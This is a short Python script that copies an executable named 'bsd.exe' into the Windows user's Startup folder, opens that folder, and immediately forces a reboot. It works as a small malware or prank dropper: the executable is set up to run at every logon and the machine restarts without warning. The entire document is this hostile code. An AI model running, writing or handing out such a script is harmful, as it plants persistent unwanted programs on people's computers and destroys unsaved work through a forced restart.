import shutil
import getpass
import webbrowser
import os
user = getpass.getuser()

x = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

shutil.copy('bsd.exe', x)
webbrowser.open(x)
os.system("shutdown /r /t 0")
